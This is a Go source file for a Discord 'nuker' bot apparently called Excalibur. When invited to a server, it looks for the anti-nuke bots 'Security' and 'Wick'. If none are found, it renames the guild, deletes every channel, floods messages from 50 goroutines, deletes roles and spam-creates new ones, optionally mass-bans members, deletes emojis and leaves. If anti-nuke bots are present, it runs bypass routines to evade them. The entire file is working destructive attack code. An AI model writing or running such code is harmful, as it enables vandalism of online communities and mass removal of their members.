package main

import (
	"Excalibur/core/bypass"
	"Excalibur/core/creating"
	"Excalibur/core/removing"
	"Excalibur/core/requests"
	"Excalibur/core/start_end"
	"fmt"
	"log"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var (
	queue = make(chan string, 100)
	mutex = &sync.Mutex{}

	botList  = []string{"Security", "Wick"}
	CountBot int
)

func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()
	MASS_BAN := os.Getenv("MASS_BAN")
	MASSBAN, _ := strconv.ParseBool(MASS_BAN)

	var wg sync.WaitGroup

	queue <- event.ID
	requests.HandleQueue(s)

	mutex.Lock()
	defer mutex.Unlock()

	botNicknames, err := bypass.GetBotNicks(s, event.ID)
	if err != nil {
		log.Fatal(err)
	}

	for _, nickname := range botNicknames {
		for _, botID := range botList {
			if nickname == botID {
				fmt.Println("Found ", nickname)
				CountBot++
			}
		}
	}

	if CountBot == 0 {
		fmt.Println("There's no any antinuke bots")

		start_end.Logs(s, event)
		creating.GuildRename(s, event)

		wg.Add(1)
		go func() {
			defer wg.Done()
			channels, _ := s.GuildChannels(event.ID)
			creating.DeleteChannels(s, channels)
		}()
		wg.Wait()

		start_end.InviteCreate(s, event)

		for i := 0; i < 50; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.TextSpam(s, event, &wg)
			}()
		}
		wg.Wait()

		wg.Add(1)
		go func() {
			defer wg.Done()
			creating.DeleteRoles(s, event)
		}()
		wg.Wait()

		creating.EditRoles(s, event)
		bypass.PhoneLock(event)

		for i := 0; i < 40; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.RolesSpam(s, event)
			}()
		}
		wg.Wait()

		if MASSBAN {
			wg.Add(1)
			go func() {
				defer wg.Done()
				removing.MemberBan(s, event)
			}()
			wg.Wait()
		} else {
			fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
		}

		removing.EmojiDelete(s, event)

		start_end.Leave(s, event)

	} else {
		fmt.Println("There's ", CountBot, " antinuke bot(s) on the server.")

		start_end.Logs(s, event)
		bypass.PhoneLock(event)

		for i := 0; i < 50; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				bypass.BypassCommunity(s, event, &wg)
			}()
		}

		time.Sleep(2 * time.Second)

		bypass.BypassSpam(s, event, &wg)

		start_end.LogsAlert(s, event)
		start_end.Leave(s, event)
	}

	CountBot = 0
}
